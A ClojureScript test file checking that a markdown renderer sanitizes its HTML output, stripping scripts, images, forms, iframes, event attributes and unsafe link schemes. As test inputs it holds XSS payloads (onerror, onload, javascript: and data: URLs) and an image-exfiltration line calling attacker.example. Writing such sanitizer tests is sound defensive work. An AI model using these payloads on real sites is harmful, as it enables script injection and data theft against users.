(ns manager-web.components.markdown-test
  (:require ["jsdom" :refer [JSDOM]]
            ["react-dom/server" :as server]
            [clojure.set :as set]
            [clojure.string :as string]
            [clojure.test :refer [deftest is testing]]
            [manager-web.components.markdown :as markdown]
            [reagent.core :as r]))

(def ^:private purifier
  (markdown/purifier (.-window (JSDOM. ""))))

(defn- render
  [text]
  (markdown/html purifier text))

(defn- fragment
  [text]
  (let [document
        (.-document (.-window (JSDOM. "")))

        container
        (.createElement document "div")]
    (set! (.-innerHTML container) (render text))
    container))

(defn- tags
  [text]
  (set (map #(string/lower-case (.-tagName %))
            (array-seq (.querySelectorAll (fragment text) "*")))))

(defn- attributes
  [text]
  (set (for [element (array-seq (.querySelectorAll (fragment text) "*"))
             attribute (array-seq (.-attributes element))]
         (.-name attribute))))

(deftest renders-markdown
  (is
   (= #{"h1" "p" "strong" "ul" "li" "code" "pre" "a" "table" "thead" "tbody" "tr" "th" "td"}
      (tags (string/join "\n" ["# Title"
                               ""
                               "Some **bold** text and [a link](https://example.com)."
                               ""
                               "- item"
                               ""
                               "```"
                               "code"
                               "```"
                               ""
                               "| a | b |"
                               "|---|---|"
                               "| 1 | 2 |"])))))

(deftest raw-html-is-shown-as-text
  (testing "block and inline HTML"
    (is
     (= #{"p"}
        (tags "<style>body{display:none}</style>\n\nhi <b onclick=\"x()\">there</b> <script>alert(1)</script>")))
    (is
     (string/includes? (.-textContent (fragment "<style>body{}</style>"))
                       "<style>body{}</style>"))))

(deftest forbidden-elements-never-render
  (doseq [source ["<img src=x onerror=alert(1)>"
                  "![leak](https://attacker.example/?d=secret)"
                  "<form action=https://evil.example><input name=p><button>Go</button></form>"
                  "<iframe src=https://evil.example></iframe>"
                  "<svg onload=alert(1)></svg>"
                  "- [x] done"]]
    (is
     (empty? (set/intersection #{"img" "form" "input" "button" "iframe" "svg" "style" "script"}
                               (tags source)))
     source)))

(deftest images-become-their-alt-text
  (is
   (string/includes? (.-textContent (fragment "![a diagram](https://example.com/x.png)"))
                     "a diagram")))

(deftest no-style-event-or-data-attributes
  (is
   (empty? (set/intersection #{"style" "onclick" "onerror" "id" "class" "data-testid"}
                             (attributes "[x](https://example.com \"t\")\n\n```js\ncode\n```")))))

(deftest links-are-limited-to-safe-schemes
  (doseq [unsafe ["javascript:alert(1)" "data:text/html,<script>alert(1)</script>" "vbscript:x" "/relative" "//evil.example"]]
    (is
     (nil? (.querySelector (fragment (str "[click](" unsafe ")")) "a[href]"))
     unsafe))
  (is
   (= "https://example.com/"
      (.getAttribute (.querySelector (fragment "[ok](https://example.com/)") "a") "href"))))

(deftest links-open-in-a-new-tab-without-opener
  (let [link
        (.querySelector (fragment "[ok](https://example.com/)") "a")]
    (is
     (= "_blank"
        (.getAttribute link "target")))
    (is
     (= "noopener noreferrer"
        (.getAttribute link "rel")))))

(deftest the-component-shows-the-document
  (let [sanitized
        markdown/html]
    (with-redefs [markdown/html (fn
                                  ([text] (sanitized purifier text))
                                  ([jsdom-purifier text] (sanitized jsdom-purifier text)))]
      (is
       (true?
        (string/includes? (server/renderToString (r/as-element [markdown/markdown "## Requirements"]))
                          "<h2>Requirements</h2>"))))))
